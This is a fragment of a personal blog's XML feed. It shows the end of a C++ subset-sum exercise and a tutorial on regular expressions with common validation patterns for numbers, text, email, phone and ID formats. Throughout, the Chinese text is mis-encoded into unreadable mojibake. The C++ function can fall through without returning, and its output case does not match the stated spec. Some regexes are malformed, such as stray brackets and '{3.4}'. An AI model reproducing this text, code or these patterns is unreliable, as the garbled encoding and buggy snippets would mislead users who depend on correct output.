title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>å¯¹äºæ¯ç»„æµ‹è¯•ç”¨ä¾‹ï¼Œç¬¬ä¸€è¡Œä¸€ä¸ªæ­£æ•´æ•°nï¼Œç¬¬äºŒè¡Œnä¸ªæ•´æ•°ï¼Œç¬¬ä¸‰è¡Œä¸€ä¸ªæ•´æ•°kã€‚</p><p><em>1*</em>â‰¤<strong>N</strong>â‰¤*<em>20</em>ï¼Œè¾“å…¥æ•´æ•°åŠkå‡å°äº<em>1e8</em>ã€‚</p><h3 id="è¾“å‡º-6"><a href="#è¾“å‡º-6" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>è‹¥å¯ä»¥ä½¿å¾—å’Œä¸ºkï¼Œè¾“å‡ºâ€Yesâ€,å¦åˆ™â€Noâ€ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-7"><a href="#æ ·ä¾‹è¾“å…¥-7" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code class="hljs basic"><span class="hljs-number">4</span><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">7</span><span class="hljs-number">13</span></code></pre><h3 id="æ ·ä¾‹è¾“å‡º-7"><a href="#æ ·ä¾‹è¾“å‡º-7" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code class="hljs ebnf"><span class="hljs-attribute">Yes</span></code></pre><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> s[<span class="hljs-number">25</span>];<span class="hljs-keyword">int</span> n,m;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> a)</span></span><span class="hljs-function"></span>&#123; <span class="hljs-keyword">if</span>(a==m) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">if</span>(l==n) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a+s[l])) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;n;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;s[i];&#125;<span class="hljs-built_in">cin</span>&gt;&gt;m;<span class="hljs-keyword">if</span>(check(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;YES&quot;</span>;<span class="hljs-keyword">else</span><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;NO&quot;</span>; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>c++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ­£åˆ™è¡¨è¾¾å¼</title>
    <link href="/2020/11/01/preg/"/>
    <url>/2020/11/01/preg/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¸€äº›ä»£ç å®¡è®¡çš„é¢˜ç›®å½“ä¸­ç»å¸¸ä¼šå‡ºç°ä½¿ç”¨æ­£åˆ™è¡¨è¾¾è¿‡æ»¤å­—ç¬¦ä¸²çš„æƒ…å†µï¼Œæ‰€ä»¥æœ‰å¿…è¦ç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹ï¼</p><span id="more"></span><h1 id="ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼"><a href="#ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼"></a>ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼</h1><p><a href="https://www.runoob.com/regexp/regexp-example.html">è¯¦æƒ…è§è¿™</a></p><p>èœé¸¡æ•™ç¨‹ä¸­ä»‹ç»çš„å¾ˆè¯¦ç»†ã€‚</p><h2 id="ç‰¹æ®Šå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦</h2><p>è®¸å¤šå…ƒå­—ç¬¦è¦æ±‚åœ¨è¯•å›¾åŒ¹é…å®ƒä»¬æ—¶ç‰¹åˆ«å¯¹å¾…ã€‚è‹¥è¦åŒ¹é…è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¿…é¡»é¦–å…ˆä½¿å­—ç¬¦â€è½¬ä¹‰â€ï¼Œå³ï¼Œå°†åæ–œæ å­—ç¬¦<strong>\</strong> æ”¾åœ¨å®ƒä»¬å‰é¢ã€‚ä¸‹è¡¨åˆ—å‡ºäº†æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼š</p><table><thead><tr><th align="left">ç‰¹åˆ«å­—ç¬¦</th><th align="right">æè¿°</th></tr></thead><tbody><tr><td align="left">$</td><td align="right">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œåˆ™ $ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ã€‚è¦åŒ¹é… $ å­—ç¬¦æœ¬èº«ï¼Œè¯·ä½¿ç”¨ \$ã€‚</td></tr><tr><td align="left">( )</td><td align="right">æ ‡è®°ä¸€ä¸ªå­è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸä½ç½®ã€‚å­è¡¨è¾¾å¼å¯ä»¥è·å–ä¾›ä»¥åä½¿ç”¨ã€‚è¦åŒ¹é…è¿™äº›å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ ( å’Œ )ã€‚</td></tr><tr><td align="left">*</td><td align="right">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚è¦åŒ¹é… * å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ \*ã€‚</td></tr><tr><td align="left">+</td><td align="right">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚è¦åŒ¹é… + å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ \+ã€‚</td></tr><tr><td align="left">.</td><td align="right">åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ã€‚è¦åŒ¹é… . ï¼Œè¯·ä½¿ç”¨ \. ã€‚</td></tr><tr><td align="left">[</td><td align="right">æ ‡è®°ä¸€ä¸ªä¸­æ‹¬å·è¡¨è¾¾å¼çš„å¼€å§‹ã€‚è¦åŒ¹é… [ï¼Œè¯·ä½¿ç”¨\[ã€‚</td></tr><tr><td align="left">?</td><td align="right">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦ã€‚è¦åŒ¹é… ? å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ ?ã€‚</td></tr><tr><td align="left">\</td><td align="right">å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºæˆ–ç‰¹æ®Šå­—ç¬¦ã€æˆ–åŸä¹‰å­—ç¬¦ã€æˆ–å‘åå¼•ç”¨ã€æˆ–å…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜nâ€™ åŒ¹é…å­—ç¬¦ â€˜nâ€™ã€‚â€™\nâ€™ åŒ¹é…æ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\â€˜ åŒ¹é… â€œ&quot;ï¼Œè€Œ â€˜(â€˜ åˆ™åŒ¹é… â€œ(â€œã€‚</td></tr><tr><td align="left">^</td><td align="right">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼Œé™¤éåœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨ï¼Œå½“è¯¥ç¬¦å·åœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºä¸æ¥å—è¯¥æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­çš„å­—ç¬¦é›†åˆã€‚è¦åŒ¹é… ^ å­—ç¬¦æœ¬èº«ï¼Œè¯·ä½¿ç”¨ ^ã€‚</td></tr><tr><td align="left">{</td><td align="right">æ ‡è®°é™å®šç¬¦è¡¨è¾¾å¼çš„å¼€å§‹ã€‚è¦åŒ¹é… {ï¼Œè¯·ä½¿ç”¨ \{ã€‚</td></tr><tr><td align="left">|</td><td align="right">æŒ‡æ˜ä¸¤é¡¹ä¹‹é—´çš„ä¸€ä¸ªé€‰æ‹©ã€‚è¦åŒ¹é… |ï¼Œè¯·ä½¿ç”¨ \</td></tr></tbody></table><h2 id="é™å®šç¬¦"><a href="#é™å®šç¬¦" class="headerlink" title="é™å®šç¬¦"></a>é™å®šç¬¦</h2><p>é™å®šç¬¦ç”¨æ¥æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç»™å®šç»„ä»¶å¿…é¡»è¦å‡ºç°å¤šå°‘æ¬¡æ‰èƒ½æ»¡è¶³åŒ¹é…ã€‚æœ‰ <strong>*** æˆ– **+</strong> æˆ– <strong>?</strong> æˆ– <strong>{n}</strong> æˆ– <strong>{n,}</strong> æˆ– <strong>{n,m}</strong> å…±6ç§ã€‚</p><p>æ­£åˆ™è¡¨è¾¾å¼çš„é™å®šç¬¦æœ‰ï¼š</p><table><thead><tr><th align="left">å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td align="left">*</td><td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äº{0,}ã€‚</td></tr><tr><td align="left">+</td><td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äº {1,}ã€‚</td></tr><tr><td align="left">?</td><td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€do(es)?â€ å¯ä»¥åŒ¹é… â€œdoâ€ ã€ â€œdoesâ€ ä¸­çš„ â€œdoesâ€ ã€ â€œdoxyâ€ ä¸­çš„ â€œdoâ€ ã€‚? ç­‰ä»·äº {0,1}ã€‚</td></tr><tr><td align="left">{n}</td><td>n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚</td></tr><tr><td align="left">{n,}</td><td>n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äº â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äº â€˜o*â€™ã€‚</td></tr><tr><td align="left">{n,m}</td><td>m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äº â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</td></tr></tbody></table><h1 id="å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åŠå«ä¹‰"><a href="#å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åŠå«ä¹‰" class="headerlink" title="å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åŠå«ä¹‰"></a>å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼åŠå«ä¹‰</h1><p><a href="http://c.runoob.com/front-end/854">å‚è€ƒ</a></p><pre><code class="hljs taggerscript">ä¸€ã€æ ¡éªŒæ•°å­—çš„è¡¨è¾¾å¼1. æ•°å­—ï¼š^[0-9]*$// ^è¡¨ç¤ºå­—ç¬¦çš„å¼€å§‹ï¼Œ$è¡¨ç¤ºç»“æŸ  [0-9] è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦åœ¨0-9ä¸­2. nä½çš„æ•°å­—ï¼š^<span class="hljs-symbol">\d</span>&#123;n&#125;$    // <span class="hljs-symbol">\d</span>ä¸[0-9]ç­‰ä»· ï¼Œ&#123;n&#125; nè¡¨ç¤ºåŒ¹é…næ¬¡ï¼Œæ‰€ä»¥è¡¨ç¤ºåŒ¹é…nä½æ•°3. è‡³å°‘nä½çš„æ•°å­—ï¼š^<span class="hljs-symbol">\d</span>&#123;n,&#125;$      //&#123;n,&#125;è‡³å°‘næ¬¡4. m-nä½çš„æ•°å­—ï¼š^<span class="hljs-symbol">\d</span>&#123;m,n&#125;$     //&#123;n,m&#125;  n-mæ¬¡5. é›¶å’Œéé›¶å¼€å¤´çš„æ•°å­—ï¼š^(0|[1-9][0-9]*)$  // | æ˜¯æˆ–è€…æ„æ€ï¼Œè¡¨ç¤ºåŒ¹é…å·¦å³ä¸¤ä¸ªå­è¡¨è¾¾å¼å…¶ä¸­ä¸€ä¸ªéƒ½å¯ä»¥6. éé›¶å¼€å¤´çš„æœ€å¤šå¸¦ä¸¤ä½å°æ•°çš„æ•°å­—ï¼š^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$    // +åŒ¹é…å‰é¢çš„è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ (.[0-9]&#123;1,2&#125;)? è¡¨ç¤ºåŒ¹é…  (.[0-9]&#123;1,2&#125;)ä¸€æ¬¡æˆ–é›¶æ¬¡è¿™å­è¡¨è¾¾å¼ä»£è¡¨çš„æ˜¯0.[1-9]æˆ–è€…0.[0-9][1-9]7. å¸¦1-2ä½å°æ•°çš„æ­£æ•°æˆ–è´Ÿæ•°ï¼š^(<span class="hljs-symbol">\-</span>)?<span class="hljs-symbol">\d</span>+(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>&#123;1,2&#125;)?$     // (<span class="hljs-symbol">\-</span>)? åŒ¹é…ä¸€æ¬¡æˆ–é›¶æ¬¡è´Ÿå· 8. æ­£æ•°ã€è´Ÿæ•°ã€å’Œå°æ•°ï¼š^(<span class="hljs-symbol">\-</span>|<span class="hljs-symbol">\+</span>)?<span class="hljs-symbol">\d</span>+(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>+)?$     // <span class="hljs-symbol">\-</span> <span class="hljs-symbol">\+</span> <span class="hljs-symbol">\.</span>æ˜¯å°†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰9. æœ‰ä¸¤ä½å°æ•°çš„æ­£å®æ•°ï¼š^[0-9]+(.[0-9]&#123;2&#125;)?$    10. æœ‰1~3ä½å°æ•°çš„æ­£å®æ•°ï¼š^[0-9]+(.[0-9]&#123;1,3&#125;)?$11. éé›¶çš„æ­£æ•´æ•°ï¼š^[1-9]<span class="hljs-symbol">\d</span>*$ æˆ– ^([1-9][0-9]*)&#123;1,3&#125;$ æˆ– ^<span class="hljs-symbol">\+</span>?[1-9][0-9]*$   // [1-9] æ§åˆ¶éé›¶12. éé›¶çš„è´Ÿæ•´æ•°ï¼š^<span class="hljs-symbol">\-</span>[1-9][]0-9&quot;*$ æˆ– ^-[1-9]<span class="hljs-symbol">\d</span>*$  //ä¸€ä¸‹çš„è¡¨è¾¾å¼çš„å«ä¹‰å¯ä»¥ä»¥æ­¤ç±»æ¨ï¼ˆæ„Ÿè§‰ä¸æ˜¯å¾ˆå¸¸ç”¨ï¼‰13. éè´Ÿæ•´æ•°ï¼š^<span class="hljs-symbol">\d</span>+$ æˆ– ^[1-9]<span class="hljs-symbol">\d</span>*|0$14. éæ­£æ•´æ•°ï¼š^-[1-9]<span class="hljs-symbol">\d</span>*|0$ æˆ– ^((-<span class="hljs-symbol">\d</span>+)|(0+))$15. éè´Ÿæµ®ç‚¹æ•°ï¼š^<span class="hljs-symbol">\d</span>+(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>+)?$ æˆ– ^[1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*|0?<span class="hljs-symbol">\.</span>0+|0$16. éæ­£æµ®ç‚¹æ•°ï¼š^((-<span class="hljs-symbol">\d</span>+(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>+)?)|(0+(<span class="hljs-symbol">\.</span>0+)?))$ æˆ– ^(-([1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*))|0?<span class="hljs-symbol">\.</span>0+|0$17. æ­£æµ®ç‚¹æ•°ï¼š^[1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*$ æˆ– ^(([0-9]+<span class="hljs-symbol">\.</span>[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*<span class="hljs-symbol">\.</span>[0-9]+)|([0-9]*[1-9][0-9]*))$18. è´Ÿæµ®ç‚¹æ•°ï¼š^-([1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*)$ æˆ– ^(-(([0-9]+<span class="hljs-symbol">\.</span>[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*<span class="hljs-symbol">\.</span>[0-9]+)|([0-9]*[1-9][0-9]*)))$19. æµ®ç‚¹æ•°ï¼š^(-?<span class="hljs-symbol">\d</span>+)(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>+)?$ æˆ– ^-?([1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*|0?<span class="hljs-symbol">\.</span>0+|0)$</code></pre><pre><code class="hljs gams">äºŒã€æ ¡éªŒå­—ç¬¦çš„è¡¨è¾¾å¼<span class="hljs-number">1.</span> æ±‰å­—ï¼š^[\u4e00-\u9fa5]&#123;<span class="hljs-number">0</span>,&#125;<span class="hljs-symbol">$</span>   <span class="hljs-comment">//u4e00æ˜¯unicodeä¸­ç¬¬ä¸€ä¸ªæ±‰å­—ç¼–ç  u9fa5æ˜¯æœ€åä¸€ä¸ª</span><span class="hljs-number">2.</span> è‹±æ–‡å’Œæ•°å­—ï¼š^[A-Za-z0<span class="hljs-number">-9</span>]+<span class="hljs-symbol">$</span> æˆ– ^[A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">4</span>,<span class="hljs-number">40</span>&#125;<span class="hljs-symbol">$</span>  <span class="hljs-comment">//[A-Za-z0-9]å¯ä»¥åŒ¹é…å¤§å°å†™å­—æ¯æ•°å­— </span><span class="hljs-number">3.</span> é•¿åº¦ä¸º<span class="hljs-number">3</span><span class="hljs-number">-20</span>çš„æ‰€æœ‰å­—ç¬¦ï¼š^.&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;<span class="hljs-symbol">$</span>  <span class="hljs-comment">// .ä»£è¡¨ä»»æ„å­—ç¬¦åŒ…æ‹¬æ¢è¡Œç¬¦</span><span class="hljs-number">4.</span> ç”±<span class="hljs-number">26</span>ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Za-z]+<span class="hljs-symbol">$</span><span class="hljs-number">5.</span> ç”±<span class="hljs-number">26</span>ä¸ªå¤§å†™è‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Z]+<span class="hljs-symbol">$</span><span class="hljs-number">6.</span> ç”±<span class="hljs-number">26</span>ä¸ªå°å†™è‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[a-z]+<span class="hljs-symbol">$</span><span class="hljs-number">7.</span> ç”±æ•°å­—å’Œ<span class="hljs-number">26</span>ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Za-z0<span class="hljs-number">-9</span>]+<span class="hljs-symbol">$</span> <span class="hljs-comment">//ä¸ç¬¬äºŒä¸ªè¡¨è¾¾å¼ç›¸åŒ</span><span class="hljs-number">8.</span> ç”±æ•°å­—ã€<span class="hljs-number">26</span>ä¸ªè‹±æ–‡å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^\w+<span class="hljs-symbol">$</span> æˆ– ^\w&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;<span class="hljs-symbol">$</span>   <span class="hljs-comment">//  \w=[0-9A-Za-z_]</span><span class="hljs-number">9.</span> ä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—åŒ…æ‹¬ä¸‹åˆ’çº¿ï¼š^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>_]+<span class="hljs-symbol">$</span> <span class="hljs-number">10.</span> ä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—ä½†ä¸åŒ…æ‹¬ä¸‹åˆ’çº¿ç­‰ç¬¦å·ï¼š^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]+<span class="hljs-symbol">$</span> æˆ– ^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">20</span>&#125;<span class="hljs-symbol">$</span> <span class="hljs-number">11.</span> å¯ä»¥è¾“å…¥å«æœ‰^%&amp;<span class="hljs-string">&#x27;,;=?$\&quot;ç­‰å­—ç¬¦ï¼š[^%&amp;&#x27;</span>,;=?<span class="hljs-symbol">$</span>\x22]+ <span class="hljs-number">12</span> ç¦æ­¢è¾“å…¥å«æœ‰~çš„å­—ç¬¦ï¼š[^~\x22]+  <span class="hljs-comment">//è¿™é‡Œçš„ ^æ˜¯éçš„æ„æ€</span></code></pre><p>ä¸‹é¢è¿™äº›å°±ä¸ä¸€ä¸€è§£é‡Šäº†ï¼Œå®åœ¨å¤ªå¤šäº†æœ‰çš„è¿˜æ˜¯é‡å¤ã€‚</p><pre><code class="hljs inform7">ä¸‰ã€ç‰¹æ®Šéœ€æ±‚è¡¨è¾¾å¼1. Emailåœ°å€ï¼š^\w+(<span class="hljs-comment">[-+.]</span>\w+)*@\w+(<span class="hljs-comment">[-.]</span>\w+)*\.\w+(<span class="hljs-comment">[-.]</span>\w+)*$2. åŸŸåï¼š<span class="hljs-comment">[a-zA-Z0-9]</span><span class="hljs-comment">[-a-zA-Z0-9]</span>&#123;0,62&#125;(/.<span class="hljs-comment">[a-zA-Z0-9]</span><span class="hljs-comment">[-a-zA-Z0-9]</span>&#123;0,62&#125;)+/.?3. InternetURLï¼š<span class="hljs-comment">[a-zA-z]</span>+://<span class="hljs-comment">[^\s]</span>* æˆ– ^http://(<span class="hljs-comment">[\w-]</span>+\.)+<span class="hljs-comment">[\w-]</span>+(/<span class="hljs-comment">[\w-./?%&amp;=]</span>*)?$4. æ‰‹æœºå·ç ï¼š^(13<span class="hljs-comment">[0-9]</span>|14<span class="hljs-comment">[5|7]</span>|15<span class="hljs-comment">[0|1|2|3|5|6|7|8|9]</span>|18<span class="hljs-comment">[0|1|2|3|5|6|7|8|9]</span>)\d&#123;8&#125;$5. ç”µè¯å·ç (<span class="hljs-string">&quot;XXX-XXXXXXX&quot;</span>ã€<span class="hljs-string">&quot;XXXX-XXXXXXXX&quot;</span>ã€<span class="hljs-string">&quot;XXX-XXXXXXX&quot;</span>ã€<span class="hljs-string">&quot;XXX-XXXXXXXX&quot;</span>ã€<span class="hljs-string">&quot;XXXXXXX&quot;</span>å’Œ<span class="hljs-string">&quot;XXXXXXXX)ï¼š^(\(\d&#123;3,4&#125;-)|\d&#123;3.4&#125;-)?\d&#123;7,8&#125;$</span><span class="hljs-string"></span><span class="hljs-string">6. å›½å†…ç”µè¯å·ç (0511-4405222ã€021-87888822)ï¼š\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;</span><span class="hljs-string"></span><span class="hljs-string">7. èº«ä»½è¯å·(15ä½ã€18ä½æ•°å­—)ï¼š^\d&#123;15&#125;|\d&#123;18&#125;$</span><span class="hljs-string"></span><span class="hljs-string">8. çŸ­èº«ä»½è¯å·ç (æ•°å­—ã€å­—æ¯xç»“å°¾)ï¼š^(<span class="hljs-subst">[0-9]</span>)&#123;7,18&#125;(x|X)?$ æˆ– ^\d&#123;8,18&#125;|<span class="hljs-subst">[0-9x]</span>&#123;8,18&#125;|<span class="hljs-subst">[0-9X]</span>&#123;8,18&#125;?$</span><span class="hljs-string"></span><span class="hljs-string">9. å¸å·æ˜¯å¦åˆæ³•(å­—æ¯å¼€å¤´ï¼Œå…è®¸5-16å­—èŠ‚ï¼Œå…è®¸å­—æ¯æ•°å­—ä¸‹åˆ’çº¿)ï¼š^<span class="hljs-subst">[a-zA-Z]</span><span class="hljs-subst">[a-zA-Z0-9_]</span>&#123;4,15&#125;$</span><span class="hljs-string"></span><span class="hljs-string">10. å¯†ç (ä»¥å­—æ¯å¼€å¤´ï¼Œé•¿åº¦åœ¨6~18ä¹‹é—´ï¼Œåªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿)ï¼š^<span class="hljs-subst">[a-zA-Z]</span>\w&#123;5,17&#125;$</span><span class="hljs-string"></span><span class="hljs-string">11. å¼ºå¯†ç (å¿…é¡»åŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—çš„ç»„åˆï¼Œä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ï¼Œé•¿åº¦åœ¨8-10ä¹‹é—´)ï¼š^(?=.*\d)(?=.*<span class="hljs-subst">[a-z]</span>)(?=.*<span class="hljs-subst">[A-Z]</span>).&#123;8,10&#125;$</span><span class="hljs-string"></span><span class="hljs-string">12. æ—¥æœŸæ ¼å¼ï¼š^\d&#123;4&#125;-\d&#123;1,2&#125;-\d&#123;1,2&#125;</span><span class="hljs-string"></span><span class="hljs-string">13. ä¸€å¹´çš„12ä¸ªæœˆ(01ï½09å’Œ1ï½12)ï¼š^(0?<span class="hljs-subst">[1-9]</span>|1<span class="hljs-subst">[0-2]</span>)$</span><span class="hljs-string"></span><span class="hljs-string">14. ä¸€ä¸ªæœˆçš„31å¤©(01ï½09å’Œ1ï½31)ï¼š^((0?<span class="hljs-subst">[1-9]</span>)|((1|2)<span class="hljs-subst">[0-9]</span>)|30|31)$</span><span class="hljs-string"></span><span class="hljs-string">14 é’±çš„è¾“å…¥æ ¼å¼ï¼š</span><span class="hljs-string"></span><span class="hljs-string">15    1.æœ‰å››ç§é’±çš„è¡¨ç¤ºå½¢å¼æˆ‘ä»¬å¯ä»¥æ¥å—:&quot;</span>10000.00<span class="hljs-string">&quot; å’Œ 